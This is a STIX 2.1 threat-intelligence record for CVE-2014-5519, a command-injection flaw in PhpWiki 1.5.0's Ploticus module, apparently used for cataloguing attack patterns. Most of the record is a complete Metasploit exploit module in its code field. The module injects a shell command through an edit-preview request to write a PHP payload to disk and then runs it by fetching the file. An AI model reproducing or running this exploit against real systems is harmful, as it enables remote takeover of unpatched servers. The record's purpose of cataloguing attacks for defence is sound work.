{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cff8be38-631f-4006-9bcb-88c05af23417",
    "created": "2024-08-14T17:10:53.316002Z",
    "modified": "2024-08-14T17:10:53.316006Z",
    "name": "Phpwiki Ploticus Remote Code Execution",
    "description": " The Ploticus module in PhpWiki 1.5.0 allows remote attackers to execute arbitrary code via command injection. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/phpwiki_ploticus_exec.rb",
            "external_id": "phpwiki_ploticus_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-5519"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Aug/77#Thedaythevulnwentpublic"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Phpwiki Ploticus Remote Code Execution',\n      'Description'    => %q{\n        The Ploticus module in PhpWiki 1.5.0 allows remote attackers to execute arbitrary\n        code via command injection.\n      },\n      'Author'         =>\n        [\n          'Benjamin Harris',              # Discovery and POC\n          'us3r777 <us3r777[at]n0b0.so>'  # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2014-5519' ],\n          [ 'OSVDB', '110576' ],\n          [ 'EDB', '34451'],\n          [ 'URL', 'https://sourceforge.net/p/phpwiki/code/8974/?page=1' ], # This commit prevents exploitation\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Aug/77' ] # The day the vuln went public\n        ],\n      'Payload'\t       =>\n        {\n          'BadChars'   => \"\\x00\",\n        },\n      'Platform'       => 'php',\n      'Arch'\t\t       => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ],\n          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-09-11'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The full URI path to phpwiki', '/phpwiki']) ,\n      ])\n  end\n\n  def exploit\n    uri =  target_uri.path\n\n    payload_name = \"#{rand_text_alpha(8)}.php\"\n    php_payload = get_write_exec_payload(:unlink_self=>true)\n\n    res = send_request_cgi({\n      'uri'      => normalize_uri(uri + '/index.php/HeIp'),\n      'method'    => 'POST',\n      'vars_post' =>\n      {\n        'pagename'      => 'HeIp',\n        'edit[content]' => \"<<Ploticus device=\\\";echo '#{php_payload}' > #{payload_name};\\\" -prefab= -csmap= data= alt= help= >>\",\n        'edit[preview]' => 'Preview',\n        'action'        => 'edit'\n      }\n    })\n\n    if not res or res.code != 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Upload failed\")\n    end\n\n    upload_uri = normalize_uri(uri + \"/\" + payload_name)\n    print_status(\"Executing payload #{payload_name}\")\n    send_request_raw({\n      'uri'    => upload_uri,\n      'method' => 'GET'\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-11",
    "x_mitre_platforms": [
        "php'"
    ]
}